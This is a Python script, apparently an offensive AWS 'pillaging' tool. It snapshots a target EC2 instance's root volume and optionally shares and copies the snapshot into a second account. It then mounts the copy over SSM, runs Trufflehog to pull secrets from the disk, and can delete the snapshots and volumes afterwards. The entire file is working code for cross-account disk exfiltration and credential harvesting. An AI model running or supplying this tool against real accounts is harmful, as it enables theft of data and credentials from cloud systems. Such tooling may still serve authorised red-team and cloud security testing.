import boto3
import botocore
import os
import subprocess
import logging
import argparse
import string
import time
from botocore.exceptions import ClientError  
import json
import re
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def list_ebs_volumes(ec2_resource):
    """List all available EBS volumes and snapshots."""
    try:
        volumes = [volume for volume in ec2_resource.volumes.all() if volume.state == 'available']
        snapshots = list(ec2_resource.snapshots.filter(OwnerIds=['self']))

        volume_details = []
        for volume in volumes:
            volume_info = {
                'VolumeId': volume.id,
                'State': volume.state,
                'Size': volume.size,
                'SnapshotId': volume.snapshot_id
            }
            volume_details.append(volume_info)
            logging.info(f"EBS Volume ID: {volume.id}, State: {volume.state}, Size: {volume.size} GiB, Snapshot ID: {volume.snapshot_id}")

        snapshot_details = []
        for snapshot in snapshots:
            snapshot_info = {
                'SnapshotId': snapshot.id,
                'VolumeId': snapshot.volume_id,
                'State': snapshot.state,
                'StartTime': snapshot.start_time
            }
            snapshot_details.append(snapshot_info)
            logging.info(f"Snapshot ID: {snapshot.id}, Volume ID: {snapshot.volume_id}, State: {snapshot.state}, Start Time: {snapshot.start_time}")

        return volume_details, snapshot_details
    except Exception as e:
        logging.error(f"Failed to list EBS volumes and snapshots: {str(e)}")
        return [], []

def list_ec2_instances(src_profile, src_region):
    """List all EC2 instances along with their IP addresses."""
    try:
        session = boto3.Session(profile_name=src_profile, region_name=src_region)
        ec2_resource = session.resource('ec2')
        instances = list(ec2_resource.instances.all())
        
        instance_details = []
        for instance in instances:
            instance_info = {
                'InstanceId': instance.id,
                'State': instance.state['Name'],
                'PublicIpAddress': instance.public_ip_address,
                'PrivateIpAddress': instance.private_ip_address
            }
            instance_details.append(instance_info)
            #logging.info(f"Instance ID: {instance.id}, State: {instance.state['Name']}, Public IP: {instance.public_ip_address}, Private IP: {instance.private_ip_address}")
        
        return instance_details
    except Exception as e:
        logging.error(f"Failed to list EC2 instances: {str(e)}")
        return []
    
def create_snapshot(ec2_client, instance_id, profile_name, region_name):
    """Create a snapshot of the root volume of the specified EC2 instance."""
    logging.info(f"Creating snapshot for instance {instance_id} using client in region {region_name} and profile {profile_name}")
    try:
        session = boto3.Session(profile_name=profile_name, region_name=region_name)
        ec2_client = session.client('ec2')

        instance = ec2_client.describe_instances(InstanceIds=[instance_id])
        reservations = instance.get('Reservations', [])
        if not reservations:
            raise ValueError(f"No reservations found for instance {instance_id}")
        
        instances = reservations[0].get('Instances', [])
        if not instances:
            raise ValueError(f"No instances found in reservation for instance {instance_id}")

        root_device = instances[0].get('RootDeviceName')
        if not root_device:
            raise ValueError(f"No root device found for instance {instance_id}")
        
        volumes = instances[0].get('BlockDeviceMappings', [])
        src_volume_id = next((v['Ebs']['VolumeId'] for v in volumes if v['DeviceName'] == root_device), None)
        if not src_volume_id:
            raise ValueError(f"No volume ID found for instance {instance_id}")

        snapshot = ec2_client.create_snapshot(
            VolumeId=src_volume_id,
            Description='Snapshot for pillaging',
            TagSpecifications=[{
                'ResourceType': 'snapshot',
                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
            }]
        )
        
        # Wait for snapshot completion
        logging.info(f"Waiting for snapshot {snapshot['SnapshotId']} to complete...")
        ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot['SnapshotId']])
        
        logging.info(f"Snapshot {snapshot['SnapshotId']} created successfully.")
        return snapshot['SnapshotId']

    except Exception as e:
        logging.error(f"Failed to create snapshot for instance {instance_id}: {str(e)}")
        return None

def wait_for_snapshot_availability(ec2_client, snapshot_id):
    """Wait for the snapshot to be available."""
    retries = 5
    for attempt in range(retries):
        try:
            snapshot = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
            if snapshot['State'] == 'completed':
                logging.info(f"Snapshot {snapshot_id} is now available.")
                return True
            else:
                logging.info(f"Snapshot {snapshot_id} is in {snapshot['State']} state. Retrying...")
        except Exception as e:
            logging.error(f"Error while checking snapshot availability: {str(e)}")
        
        time.sleep(30)  # Wait before retrying
    
    logging.error(f"Snapshot {snapshot_id} did not become available after {retries} attempts.")
    return False

def transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot_id):
    """Transfer EBS snapshot from source account to destination account and create a volume in the destination account."""
    try:
        src_session = boto3.Session(profile_name=src_profile, region_name=src_region)
        dst_session = boto3.Session(profile_name=dst_profile, region_name=dst_region)

        ec2_src = src_session.client('ec2')
        ec2_dst = dst_session.client('ec2')
        
        # Retrieve the destination account ID using the STS client
        sts_client = dst_session.client('sts')
        dst_account_id = sts_client.get_caller_identity()['Account']
        logging.info(f"Destination account ID determined: {dst_account_id}")

        # Step 1: Modify snapshot attribute to allow destination account to copy the snapshot
        logging.info(f"Modifying snapshot {snapshot_id} attributes to allow copying by account {dst_account_id}...")
        ec2_src.modify_snapshot_attribute(
            SnapshotId=snapshot_id,
            Attribute='createVolumePermission',
            OperationType='add',
            UserIds=[dst_account_id]
        )
        logging.info(f"Snapshot {snapshot_id} permission modified successfully.")

        # Step 2: Wait for the snapshot to be fully available before copying
        if not wait_for_snapshot_availability(ec2_src, snapshot_id):
            logging.error("Source snapshot is not fully available. Aborting operation.")
            return None

        # Step 3: Copy the snapshot to the destination account
        logging.info(f"Copying snapshot {snapshot_id} to destination account {dst_profile}...")
        copied_snapshot = ec2_dst.copy_snapshot(
            SourceSnapshotId=snapshot_id,
            SourceRegion=src_region,
            Description='Snapshot for pillaging',
            TagSpecifications=[{
                'ResourceType': 'snapshot',
                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
            }]
        )

        copied_snapshot_id = copied_snapshot['SnapshotId']
        logging.info(f"Snapshot {copied_snapshot_id} transferred from {src_profile} to {dst_profile}.")

        # Step 4: Wait for the copied snapshot to become available, with retries
        retries = 10  # Increase the number of retries
        delay = 60    # Increase the delay between retries to 60 seconds
        for attempt in range(retries):
            try:
                snapshot = ec2_dst.describe_snapshots(SnapshotIds=[copied_snapshot_id])['Snapshots'][0]
                if snapshot['State'] == 'completed':
                    logging.info(f"Snapshot {copied_snapshot_id} is now available.")
                    break
                else:
                    logging.info(f"Snapshot {copied_snapshot_id} is in {snapshot['State']} state. Retrying...")
            except Exception as e:
                logging.error(f"Error while waiting for snapshot {copied_snapshot_id}: {str(e)}")

            time.sleep(delay)

        else:
            logging.error(f"Snapshot {copied_snapshot_id} did not become available after {retries} attempts.")
            return None

        # Step 5: Create the volume in the destination account from the copied snapshot
        dst_volume_id = create_volume_in_destination_account(ec2_dst, copied_snapshot_id, dst_profile, dst_region)
        return dst_volume_id  # Return the new volume ID in the destination account

    except Exception as e:
        logging.error(f"Snapshot transfer failed: {str(e)}")
        return None

def create_volume_in_destination_account(ec2_client, snapshot_id, profile_name, region_name):
    """Create a volume from the copied snapshot in the destination account."""
    logging.info(f"Creating volume from snapshot {snapshot_id} in the destination account {profile_name}...")
    try:
        # Ensure that the volume is created in the correct availability zone
        # Retrieve the list of availability zones in the destination region
        availability_zones = ec2_client.describe_availability_zones()['AvailabilityZones']
        availability_zone = availability_zones[0]['ZoneName']  # Default to the first AZ

        volume = ec2_client.create_volume(
            SnapshotId=snapshot_id,
            AvailabilityZone=availability_zone,
            TagSpecifications=[{
                'ResourceType': 'volume',
                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
            }]
        )
        dst_volume_id = volume['VolumeId']

        # Wait for the volume to become available
        logging.info(f"Waiting for volume {dst_volume_id} to become available in the destination account...")
        ec2_client.get_waiter('volume_available').wait(VolumeIds=[dst_volume_id])

        # Add a delay to ensure the volume is fully registered
        time.sleep(10)

        logging.info(f"Volume {dst_volume_id} created successfully in the destination account.")
        return dst_volume_id

    except Exception as e:
        logging.error(f"Failed to create volume in destination account: {str(e)}")
        return None
    
def find_available_device(ec2_client, instance_id):
    """Find an available device name on the EC2 instance."""
    try:
        instance = ec2_client.describe_instances(InstanceIds=[instance_id])
        root_device = instance['Reservations'][0]['Instances'][0]['RootDeviceName']
        attached_devices = [v['DeviceName'] for v in instance['Reservations'][0]['Instances'][0]['BlockDeviceMappings']]
        
        # Exclude root device from available devices and establish dictionary of devices aws cli sees (diff from what ec2 sees)
        available_devices = ['/dev/sdf', '/dev/sdg', '/dev/sdh', '/dev/sdi', '/dev/sdj', '/dev/sdk', '/dev/sdl', '/dev/sdm', '/dev/sdn', '/dev/sdo', '/dev/sdp', '/dev/sdq', '/dev/sdr', '/dev/sds', '/dev/sdt', '/dev/sdu', '/dev/sdv', '/dev/sdw', '/dev/sdx', '/dev/sdy', '/dev/sdz']
        available_devices = [dev for dev in available_devices if dev not in attached_devices and dev != root_device]

        # Choose the first available device name
        if available_devices:
            return available_devices[0]
        else:
            return None
    except Exception as e:
        logging.error(f"Failed to find available device: {str(e)}")
        return None

def create_volume(ec2_client, snapshot_id, instance_id, is_src_profile=True):
    """Create a new EBS volume from the specified snapshot in the availability zone of the EC2 instance."""
    logging.info(f"Creating volume from snapshot {snapshot_id} in the {'source' if is_src_profile else 'destination'} account...")
    try:
        # Fetch the availability zone of the EC2 instance
        instance = ec2_client.describe_instances(InstanceIds=[instance_id])
        reservations = instance.get('Reservations', [])
        if not reservations:
            raise ValueError(f"No reservations found for instance {instance_id}")
        
        instances = reservations[0].get('Instances', [])
        if not instances:
            raise ValueError(f"No instances found in reservation for instance {instance_id}")

        availability_zone = instances[0]['Placement']['AvailabilityZone']

        # Create the volume using the correct availability zone
        volume = ec2_client.create_volume(
            SnapshotId=snapshot_id,
            AvailabilityZone=availability_zone,
            TagSpecifications=[{
                'ResourceType': 'volume',
                'Tags': [{'Key': 'Name', 'Value': 'TrufflehogTesting'}]
            }]
        )
        dst_volume_id = volume['VolumeId']

        # Wait for the volume to become available
        logging.info(f"Waiting for volume {dst_volume_id} to become available...")
        ec2_client.get_waiter('volume_available').wait(VolumeIds=[dst_volume_id])

        # Add a longer delay to ensure the volume is fully registered and recognized across AWS
        logging.info("Waiting additional time for the volume to be fully registered, sleeping 30s...")
        time.sleep(30)  # Increase delay to 30 seconds or more if needed

        # Validate the volume exists in the destination account before attempting to attach
        volumes = ec2_client.describe_volumes(VolumeIds=[dst_volume_id])['Volumes']
        if not volumes:
            raise ValueError(f"Volume {dst_volume_id} does not exist or is not available.")

        logging.info(f"Volume {dst_volume_id} created successfully from snapshot {snapshot_id}.")
        return dst_volume_id

    except Exception as e:
        logging.error(f"Failed to create volume from snapshot: {str(e)}")
        return None

def delete_snapshot_and_volume(ec2_client_src, ec2_client_dst, src_snapshot_id, dst_snapshot_id, dst_volume_id, retain=False):
    """Delete the specified snapshots and EBS volume."""
    time.sleep(10)  # Delay before deletion

    try:
        # Ensure the correct client (dst profile) is used to describe and delete the volume
        logging.info(f"Checking volume state and attachments for volume {dst_volume_id} in the destination account...")
        volume_info = ec2_client_dst.describe_volumes(VolumeIds=[dst_volume_id])
        attachments = volume_info['Volumes'][0]['Attachments']
        
        if attachments:
            # Volume is attached, force detach it
            ec2_client_dst.detach_volume(VolumeId=dst_volume_id, Force=True)
            logging.info(f"Volume {dst_volume_id} forcefully detached.")

            # Wait for the volume to be fully detached
            logging.info(f"Waiting for volume {dst_volume_id} to be fully detached...")
            ec2_client_dst.get_waiter('volume_available').wait(VolumeIds=[dst_volume_id])
            logging.info(f"Volume {dst_volume_id} is now fully detached and available for deletion.")

        # Delete the destination volume
        ec2_client_dst.delete_volume(VolumeId=dst_volume_id)
        logging.info(f"Deleted volume {dst_volume_id} in destination account.")

        if not retain:
            # Delete the source snapshot
            try:
                ec2_client_src.delete_snapshot(SnapshotId=src_snapshot_id)
                logging.info(f"Deleted snapshot {src_snapshot_id} in source account.")
            except botocore.exceptions.ClientError as e:
                if e.response['Error']['Code'] == 'InvalidSnapshot.NotFound':
                    logging.warning(f"Snapshot {src_snapshot_id} was already deleted or does not exist in the source account.")
                else:
                    raise

            # Delete the destination snapshot
            try:
                ec2_client_dst.delete_snapshot(SnapshotId=dst_snapshot_id)
                logging.info(f"Deleted snapshot {dst_snapshot_id} in destination account.")
            except botocore.exceptions.ClientError as e:
                if e.response['Error']['Code'] == 'InvalidSnapshot.NotFound':
                    logging.warning(f"Snapshot {dst_snapshot_id} was already deleted or does not exist in the destination account.")
                else:
                    raise
        else:
            logging.info(f"Retaining snapshots {src_snapshot_id} and {dst_snapshot_id}.")
    except Exception as e:
        logging.error(f"Failed to delete volume or snapshots: {str(e)}")

def find_attached_volumes(instance_id, ssm_client):
    """Find attached NVMe volumes for the specified EC2 instance using SSM."""
    # Run lsblk command on the instance using SSM
    response = ssm_client.send_command(
        InstanceIds=[instance_id],
        DocumentName="AWS-RunShellScript",
        Parameters={'commands': ['lsblk --json']}
    )

    # Get the command execution ID to retrieve the output
    command_id = response['Command']['CommandId']

    # Wait for the command to complete and get the output
    output = ''
    while True:
        time.sleep(5)  # Adjust the sleep duration as needed
        command_output = ssm_client.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
            PluginName='aws:runShellScript'
        )
        if command_output['Status'] in ['Success', 'Failed']:
            output = command_output['StandardOutputContent']
            break

    # Parse the JSON output of lsblk to get the attached NVMe volumes
    attached_nvme_volumes = []
    if output:
        lsblk_output = json.loads(output)
        for disk in lsblk_output['blockdevices']:
            if disk['name'].startswith('nvme') and disk.get('children'):
                for partition in disk['children']:
                    if partition['name'].startswith('nvme'):
                        attached_nvme_volumes.append(partition['name'])

    return attached_nvme_volumes
    
def mount_ebs_volume(instance_id, volume_id, ssh_key_path, mount_path, profile_name, region):
    """Mount the Linux partition of an EBS volume to a specified instance with SSM."""
    try:
        session = boto3.Session(profile_name=profile_name, region_name=region)
        ec2_client = session.client('ec2')
        ssm_client = session.client('ssm')

        # Unmount the --mount-path if it is currently mounted
        logging.info(f"Checking if {mount_path} is currently mounted...")
        check_mount_command = f"mount | grep -i {mount_path}"
        check_mount_response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [check_mount_command]}
        )
        check_mount_command_id = check_mount_response['Command']['CommandId']
        time.sleep(10)

        check_mount_output = ssm_client.get_command_invocation(
            CommandId=check_mount_command_id,
            InstanceId=instance_id,
            PluginName='aws:runShellScript'
        )

        if 'StandardOutputContent' in check_mount_output and check_mount_output['StandardOutputContent']:
            logging.info(f"{mount_path} is currently mounted. Unmounting...")
            unmount_command = f"sudo umount {mount_path}"
            unmount_response = ssm_client.send_command(
                InstanceIds=[instance_id],
                DocumentName="AWS-RunShellScript",
                Parameters={'commands': [unmount_command]}
            )
            unmount_command_id = unmount_response['Command']['CommandId']
            time.sleep(10)

            unmount_output = ssm_client.get_command_invocation(
                CommandId=unmount_command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )

            if 'StandardErrorContent' in unmount_output and unmount_output['StandardErrorContent']:
                logging.error(f"Failed to unmount {mount_path}: {unmount_output['StandardErrorContent']}")
                return None
            logging.info(f"Unmounted {mount_path} successfully.")

        # Attach the volume to the instance
        device_name = find_available_device(ec2_client, instance_id)
        if not device_name:
            logging.error(f"No available device name found for attachment on instance {instance_id}.")
            return None

        ec2_client.attach_volume(
            VolumeId=volume_id,
            InstanceId=instance_id,
            Device=device_name
        )

        logging.info(f"Volume {volume_id} attached to {instance_id} as {device_name}. Sleeping 30s to allow attachment recognition.")

        # Wait for the volume to be attached and recognized by the instance
        time.sleep(30)  # Increased delay to allow attachment recognition

        # Check attached volumes and get the correct device name
        attached_volumes = find_attached_volumes(instance_id, ssm_client)
        logging.info(f"Attached volumes: {attached_volumes}")

        # Assuming last attached volume is the correct one
        correct_device_name = attached_volumes[-3]  # Assuming the correct device name (e.g., nvmeXn1p1)

        # Create the mount directory if it doesn't exist
        create_dir_command = f"sudo mkdir -p {mount_path}"
        create_dir_response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [create_dir_command]}
        )
        create_dir_command_id = create_dir_response['Command']['CommandId']
        logging.info(f"SSM command ID for creating directory: {create_dir_command_id}")

        # Wait for the directory creation command to complete
        time.sleep(10)

        # Run the mount command using SSM
        mount_command = f"sudo mount /dev/{correct_device_name} {mount_path}"  # Using the correct device name
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [mount_command]}
        )

        command_id = response['Command']['CommandId']
        logging.info(f"SSM command ID for mounting: {command_id}")

        # Wait for command execution and fetch the command invocation
        time.sleep(20)  # Allow time for command execution
        command_output = ssm_client.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
            PluginName='aws:runShellScript'
        )

        if command_output['Status'] == 'Success':
            logging.info("Volume mounted successfully.")
        else:
            logging.error(f"SSM command failed with error: {command_output.get('StandardErrorContent', 'No error message available')}")
            return None

        # Verify the mount was successful
        verify_mount_command = f"ls {mount_path}"
        verify_response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [verify_mount_command]}
        )

        verify_command_output = ssm_client.get_command_invocation(
            CommandId=verify_response['Command']['CommandId'],
            InstanceId=instance_id,
            PluginName='aws:runShellScript'
        )

        if 'StandardOutputContent' in verify_command_output and verify_command_output['StandardOutputContent']:
            logging.info(f"Contents of {mount_path} after mounting: {verify_command_output['StandardOutputContent']}")
            return mount_path
        else:
            logging.error(f"Failed to verify the mount or directory is empty: {mount_path}")
            return None

    except ssm_client.exceptions.InvocationDoesNotExist as e:
        # Log the InvocationDoesNotExist error but proceed if the command has already succeeded
        logging.error(f"InvocationDoesNotExist error for command ID: {command_id}. Ignoring since the command was executed successfully.")
        return mount_path  # Proceed as the command succeeded
    except Exception as e:
        logging.error(f"Failed to attach and mount volume {volume_id} to {instance_id}: {str(e)}")
        return None

def install_trufflehog_ssm(instance_id, ssm_client):
    try:
        # First, check if Trufflehog is already installed
        check_command = "if command -v /tmp/trufflehog > /dev/null; then echo 'exists'; else echo 'missing'; fi"
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [check_command]}
        )
        command_id = response['Command']['CommandId']

        # Wait for the check command to complete
        while True:
            time.sleep(5)  # Adjust the sleep duration as needed
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )
            if command_output['Status'] in ['Success', 'Failed']:
                break

        # Determine if installation is needed
        if 'StandardOutputContent' in command_output and 'exists' in command_output['StandardOutputContent']:
            logging.info("Trufflehog is already installed on the instance.")
            return command_id  # Trufflehog already installed, return success

        # Proceed with installation if missing
        install_command = """
            sudo apt update && sudo apt install -y wget && \
            wget https://github.com/trufflesecurity/trufflehog/releases/download/v3.75.0/trufflehog_3.75.0_linux_amd64.tar.gz -O /tmp/trufflehog.tar.gz && \
            tar xzf /tmp/trufflehog.tar.gz -C /tmp/ && \
            chmod +x /tmp/trufflehog && \
            if command -v /tmp/trufflehog > /dev/null; then echo 'installation success'; else echo 'installation failed'; fi
        """

        # Send the install command to the instance
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [install_command]}
        )

        command_id = response['Command']['CommandId']
        logging.info(f"Trufflehog installation command ID: {command_id}")

        # Wait for the installation to complete and verify
        while True:
            time.sleep(10)  # Adjust the sleep duration as needed
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )
            if command_output['Status'] in ['Success', 'Failed']:
                break

        # Check if the installation was successful
        if 'StandardOutputContent' in command_output and 'installation success' in command_output['StandardOutputContent']:
            logging.info("Trufflehog installed successfully.")
            return command_id
        else:
            logging.error("Trufflehog installation failed.")
            return None

    except Exception as e:
        logging.error(f"Trufflehog installation over SSM failed: {str(e)}")
        return None

def run_trufflehog_ssm(instance_id, mount_point, pillage_path, ssh_key_path, ssm_client, json_output=False):
    try:
        # Install Trufflehog first
        install_command_id = install_trufflehog_ssm(instance_id, ssm_client)
        if not install_command_id:
            logging.error("Failed to initiate Trufflehog installation.")
            return None

        # Combine the mount path and pillage path
        full_pillage_path = os.path.join(mount_point, pillage_path.lstrip('/'))

        # SSM command to run Trufflehog and redirect output to a file
        output_file = '/tmp/trufflehog.out'
        ssm_command = f"/tmp/trufflehog filesystem {'--json' if json_output else ''} --no-verification --concurrency=5 {full_pillage_path} > {output_file}"

        # Send the run command to the instance
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [ssm_command]}
        )

        # Get the command execution ID to retrieve the output
        command_id = response['Command']['CommandId']

        # Wait for the command to complete and fetch the Trufflehog output directly from the EC2 instance
        status = stream_command_output(ssm_client, command_id, instance_id)

        if status == 'Success':
            # Read the Trufflehog output directly from the EC2 instance
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )

            if 'StandardOutputContent' in command_output:
                trufflehog_output = command_output['StandardOutputContent']
                print(trufflehog_output)  # Print the Trufflehog output to stdout

            logging.info("Trufflehog run completed over SSM.")
        elif status == 'Failed':
            logging.error("Trufflehog command execution failed.")
        else:
            logging.error(f"Trufflehog command status: {status}")

        return status  # Return the final status of Trufflehog command execution

    except Exception as e:
        logging.error(f"Trufflehog scanning over SSM failed: {str(e)}")
        return None

def stream_command_output(ssm_client, command_id, instance_id):
    try:
        time.sleep(10)  # Introduce a delay before starting to retrieve output
        while True:
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )

            if 'Status' in command_output:
                status = command_output['Status']
                if status in ['Success', 'Failed', 'Cancelled']:
                    break

            if 'StandardErrorContent' in command_output:
                logging.error(f"SSM stderr: {command_output['StandardErrorContent']}")

            time.sleep(5)

        # After the command completes, retrieve the final output
        final_output = ssm_client.get_command_invocation(
            CommandId=command_id,
            InstanceId=instance_id,
            PluginName='aws:runShellScript'
        )

        if 'StandardOutputContent' in final_output:
            # Save final stdout to a file
            with open('/tmp/trufflehog.out', 'w') as file:
                file.write(final_output['StandardOutputContent'])
            # Check if trufflehog.out is not empty and print its content
            file_path = '/tmp/trufflehog.out'
            """
            if os.path.getsize(file_path) > 0:
                with open(file_path, 'r') as file:
                    content = file.read()
                    if content.strip():  # Check if content is not just whitespace
                        print(f"Final SSM stdout length: {len(content)}")
                        print(f"Final SSM stdout: {content}")
                    else:
                        logging.error("trufflehog.out content is empty or contains only whitespace.")
            else:
                logging.error("trufflehog.out is empty.")
            """

        if 'StandardErrorContent' in final_output:
            logging.error(f"Final SSM stderr: {final_output['StandardErrorContent']}")

        return status

    except Exception as e:
        logging.error(f"Error streaming command output: {str(e)}")
        return None
    
def save_trufflehog_output(instance_id, ssm_client, out_file):
    """Save Trufflehog output to a local file."""
    try:
        # Retrieve Trufflehog output file from the instance
        get_command = f"sudo cat /tmp/trufflehog.out"
        response = ssm_client.send_command(
            InstanceIds=[instance_id],
            DocumentName="AWS-RunShellScript",
            Parameters={'commands': [get_command]}
        )

        # Get the command execution ID to track file retrieval
        command_id = response['Command']['CommandId']

        # Wait for the command to complete and fetch the output file
        while True:
            time.sleep(5)  # Adjust the sleep duration as needed
            command_output = ssm_client.get_command_invocation(
                CommandId=command_id,
                InstanceId=instance_id,
                PluginName='aws:runShellScript'
            )
            if command_output['Status'] in ['Success', 'Failed']:
                break

        # Save the output to the specified local file
        with open(out_file, 'w') as file:
            file.write(command_output['StandardOutputContent'])

        logging.info(f"Trufflehog output saved to {out_file}")

    except Exception as e:
        logging.error(f"Failed to save Trufflehog output to file: {str(e)}")

def main(src_profile, dst_profile, src_region, dst_region, list_ebs, list_ec2, mount_host, pillage, target_ec2, pillage_path, mount_path, ssh_key_path, retain=False, json_output=False, out_file=None, transfer=False):
    """Main function to handle AWS resources."""
    
    logging.debug(f"Initializing AWS sessions:")
    logging.debug(f"Source Profile: {src_profile}, Region: {src_region}")
    logging.debug(f"Destination Profile: {dst_profile}, Region: {dst_region}")

    session_src = boto3.Session(profile_name=src_profile, region_name=src_region)
    session_dst = boto3.Session(profile_name=dst_profile, region_name=dst_region)
    ec2_client_src = session_src.client('ec2')
    ec2_client_dst = session_dst.client('ec2')
    ec2_resource_dst = session_dst.resource('ec2')
    ssm_client_dst = session_dst.client('ssm')

    # Get account IDs for source and destination
    src_account_id = session_src.client('sts').get_caller_identity()['Account']
    dst_account_id = session_dst.client('sts').get_caller_identity()['Account']

    if list_ebs:
        logging.debug("Listing EBS volumes in the destination account:")
        volumes, snapshots = list_ebs_volumes(ec2_resource_dst)
        for volume in volumes:
            logging.info(f'EBS Volume ID: {volume["VolumeId"]}, State: {volume["State"]}, Size: {volume["Size"]} GiB, Snapshot ID: {volume["SnapshotId"]}')
        for snapshot in snapshots:
            logging.info(f'Snapshot ID: {snapshot["SnapshotId"]}, Volume ID: {snapshot["VolumeId"]}, State: {snapshot["State"]}, Start Time: {snapshot["StartTime"]}')
        return  # Exit after listing EBS volumes and snapshots

    if list_ec2:
        logging.debug("Listing EC2 instances in the source account:")
        instances = list_ec2_instances(src_profile, src_region)
        for instance in instances:
            logging.info(f'Instance ID: {instance["InstanceId"]}, State: {instance["State"]}, Public IP: {instance["PublicIpAddress"]}, Private IP: {instance["PrivateIpAddress"]}')
        return  # Exit after listing EC2 instances

    if pillage and mount_host and target_ec2:
        logging.debug(f"Creating snapshot for target EC2 instance {target_ec2} in the source account {src_profile}:")
        snapshot_id = create_snapshot(ec2_client_src, target_ec2, src_profile, src_region)
        if snapshot_id:
            if src_account_id != dst_account_id and transfer:
                logging.debug(f"Transferring snapshot {snapshot_id} from {src_profile} to {dst_profile}")
                transferred_volume_id = transfer_snapshot(src_profile, dst_profile, src_region, dst_region, snapshot_id)
                if not transferred_volume_id:
                    logging.error("Snapshot transfer failed, aborting operation.")
                    return
                dst_volume_id = transferred_volume_id
            elif src_account_id == dst_account_id:
                logging.debug(f"Creating volume from snapshot {snapshot_id} in the same account.")
                dst_volume_id = create_volume(ec2_client_src, snapshot_id, target_ec2, is_src_profile=True)
            else:
                logging.error("Source and destination accounts are different. You must pass the --transfer argument for cross-account operations.")
                return

            if dst_volume_id:
                logging.info(f'Volume {dst_volume_id} created in the {"source" if src_account_id == dst_account_id else "destination"} account and attached to instance {mount_host}.')

                logging.debug(f"Mounting EBS volume {dst_volume_id} on instance {mount_host} in the {'source' if src_account_id == dst_account_id else 'destination'} account")
                mount_point = mount_ebs_volume(mount_host, dst_volume_id, ssh_key_path, mount_path, dst_profile if src_account_id != dst_account_id else src_profile, dst_region if src_account_id != dst_account_id else src_region)
                if mount_point:
                    logging.info(f'Volume {dst_volume_id} mounted to {mount_point}')

                    logging.debug(f"Running Trufflehog on mounted volume at {mount_point}")
                    status = run_trufflehog_ssm(mount_host, mount_point, pillage_path, ssh_key_path, ssm_client_dst, json_output=json_output)
                    if status == 'Success':
                        if out_file:
                            logging.debug(f"Saving Trufflehog output to {out_file}")
                            save_trufflehog_output(mount_host, ssm_client_dst, out_file)
                        if not retain:
                            logging.debug(f"Deleting snapshot and volume after processing")
                            delete_snapshot_and_volume(ec2_client_src, ec2_client_dst, snapshot_id, snapshot_id, dst_volume_id)
                        else:
                            logging.info("Volume and snapshot retained.")
                    else:
                        logging.error("Trufflehog execution failed.")
                else:
                    logging.error("Failed to mount volume.")
            else:
                logging.error("Failed to create volume.")
        else:
            logging.error("Failed to create snapshot.")
    else:
        logging.error("Not all necessary parameters provided for pillaging.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Process EBS volumes and enumerate EC2 instances.')
    parser.add_argument('--list-ebs', action='store_true', help='List available EBS volumes.')
    parser.add_argument('--list-ec2', action='store_true', help='List EC2 instances.')

    parser.add_argument('--mount-host', help='EC2 instance ID to mount volumes on when pillaging.')
    parser.add_argument('--target-ec2', help='Target EC2 instance ID for snapshot and mounting.')
    parser.add_argument('--pillage', action='store_true', help='Enable mounting and processing of volumes on the specified instance.')
    parser.add_argument('--pillage-path', help='Path within the mounted volume to run Trufflehog.', default='')
    parser.add_argument('--mount-path', help='Path to mount the EBS volume.')
    parser.add_argument('--ssh-key-path', help='Path to the SSH key file for SSH commands.')
    parser.add_argument('--retain', action='store_true', help='Retain the volume and snapshot after processing.')
    parser.add_argument('--json', action='store_true', help='Enable JSON output format for Trufflehog.')
    parser.add_argument('--out-file', help='Path to save the Trufflehog output locally.')

    parser.add_argument("--transfer", action="store_true", help="Transfer snapshot between AWS accounts")
    parser.add_argument("--src-profile", help="Source AWS profile (required for transfer)")
    parser.add_argument("--dst-profile", help="Destination AWS profile (required for transfer)")
    parser.add_argument("--src-region", help="Source AWS region (required for transfer)")
    parser.add_argument("--dst-region", help="Destination AWS region (required for transfer)")

    args = parser.parse_args()

    main(args.src_profile, args.dst_profile, args.src_region, args.dst_region, args.list_ebs, args.list_ec2, args.mount_host, args.pillage, args.target_ec2, args.pillage_path, args.mount_path, args.ssh_key_path, args.retain, args.json, args.out_file, args.transfer)